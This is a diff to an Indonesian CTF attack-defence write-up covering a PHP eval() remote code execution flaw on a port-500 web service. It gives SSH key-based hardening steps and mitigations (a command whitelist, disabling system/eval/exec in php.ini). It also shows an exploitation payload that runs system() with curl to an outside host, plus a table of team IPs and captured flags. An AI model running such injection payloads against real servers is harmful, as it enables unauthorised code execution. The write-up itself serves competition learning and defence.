@@ -89,5 +89,87 @@ Dampaknya adalah attacker dapat menjalankan arbitrary remote code execution jika
 Kemungkinan kita bisa memanfaatkan vulnerability tersebut untuk mendapatkan user flag dan untuk mendapatkan root flag bisa dengan mengeksekusi payload untuk reverse shell yang bisa digunakan untuk privilege escalation ke root.
 
 ## Hardening
+Berdasarkan beberapa temuan vulnerability yang ada pada service server, untuk itu perlu dilakukan hardening untuk memperkuat keamanan pada server tersebut. Hardening meliputi pada SSH dan HTTP server.
 
+### Mengubah autentikasi SSH menjadi key based
+Untuk mengamankan SSH digunakan langkah dari link [berikut](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server). Langkah-langkahnya seperti berikut ini:
+1. Generate sepasang SSH key, yaitu public key dan private key dengan command di bawah ini. Masukkan passphrase untuk menambah keamanan dari private key.
+```
+ssh-keygen
+```
+2. Pair key akan digenerate pada `/home/<username>/.ssh`. Pada direktori `/home/<username>/.ssh` akan terdapat file `id_rsa` yang merupakan private key dan harus dijaga kerahasiaannya dan `id_rsa.pub` adalah public key.
+3. Copy public key ke server dengan command berikut
+```
+ssh-copy-id <username>@<ip_address>
+```
+4. Coba untuk terhubung ke server dengan perintah di bawah.
+```
+ssh <username>@<ip_address>
+```
+5. Matikan password authentication pada SSH server. 
+```
+sudo nano /etc/ssh/sshd_config
+```
+> PasswordAuthentication no
+6. Restart service SSH
+```
+sudo systemctl restart ssh
+```
 
+Setelah melakukan langkah tersebut tingkat keamanan SSH jadi meningkat, karena dengan menggunakan key-based authentication dan menonaktifkan password authentication dapat meminimalkan kemungkinan akses ilegal jika password yang digunakan untuk autentikasi lemah.
+Namun hal yang perlu diperhatikan adalah untuk selalu menjaga kerahasiaan private key, jika private key sampai bocor maka akses ke SSH jadi terancam.
+
+### Mitigasi RCE PHP melalui fungsi eval()
+Seperti yang sudah dibahas pada tahap reconnaissance atau tahap mengumpulkan informasi, terdapat sebuah vulnerability pada HTTP server port 500 yang mampu untuk menjalankan remote code execution jika tidak ditangani.
+
+Langkah yang dilakukan untuk memitigasi vulnerability tersebut adalah dengan menggunakan whitelist command apa saja yang boleh dimasukkan seperti berikut ini
+```php
+<?php
+if (isset($_POST['exec'])) {
+  $allowedCommands = [
+    'command1' => 'echo ',
+    'command2' => 'echo "Hello World!"'
+  ];
+  $code = $_POST['code'];
+  if (array_key_exists($code, $allowedCommands)) {
+    $output = print($allowedCommands[$code]);
+    echo "Output: " . $output;
+  } else {
+    echo "Invalid command!";
+  }
+}
+?>
+```
+Langkah lain yang bisa dilakukan adalah dengan menonaktifkan fungsi `eval()`, `system()`, `shell_exec()`, dan `exec()` dengan cara menambahkannya pada konfigurasi file `php.ini` seperti berikut ini
+```
+disable_functions = system,eval,exec,shell_exec
+```
+
+Agar konfigurasi `php.ini` dapat langsung diterapkan jalankan command berikut
+```
+sudo systemctl restart nginx
+```
+
+## Exploitation
+Eksploitasi akan memanfaatkan kerentanan pada HTTP server port 500, yaitu fungsi `eval()` yang berujung pada RCE.
+Berikut adalah payload yang digunakan untuk mendapatkan user flag pada server yang masih memiliki vulnerability.
+
+```php
+echo system('curl http://143.198.214.35/flag.php');
+```
+Hasilnya kurang lebih ditunjukkan seperti gambar berikut
+![User flag](./user-flag.png)
+
+## Flag
+
+|Nama Tim |IP Address|User Flag|Root Flag|
+|---------|----------|---------|---------|
+|N1MDA|139.59.103.159|KMIPN{wkLYWHWhSUFBgghvhkgdWbidwdbAUHJR}| |
+|05-Council|68.183.181.87|KMIPN{AVPdUxCUxSUqYYCikjKcjiZJEQwpFQEfopo}| |
+|Kawah|68.183.179.125|KMIPN{tdikfdlbMQgghAyNKkjaaQrCepQfByukl}| |
+|Kebelet-Jalan|178.128.105.76|KMIPN{polkEgzjCfXplaukfsxqwhswijJrjaitalie}| |
+|UHUY_seCUR1ty|178.128.109.17|KMIPN{ByzfsgVmLGSPjajshXSzjxYXxqGGchCKsld}| |
+|Raz-Cyberitech|206.189.86.108|KMIPN{PlfwJPqpslCzWjghPerQBYLAAQacLFhBjB}| |
+|Renaisans|206.189.91.221|KMIPN{PyqwZdzfBgzLpojshLtYBSOpwNWBhSFOwp}| |
+|Siber-Awam|128.199.213.64|KMIPN{PlefTFAZOpeHXPlejshmfyaPleyUkCWPlw}| |
+|FAQ-TEAM|174.138.29.120|KMIPN{PlwtPnhdmEqPwyuvBXzQvGhikwZLXaPlwu}| |
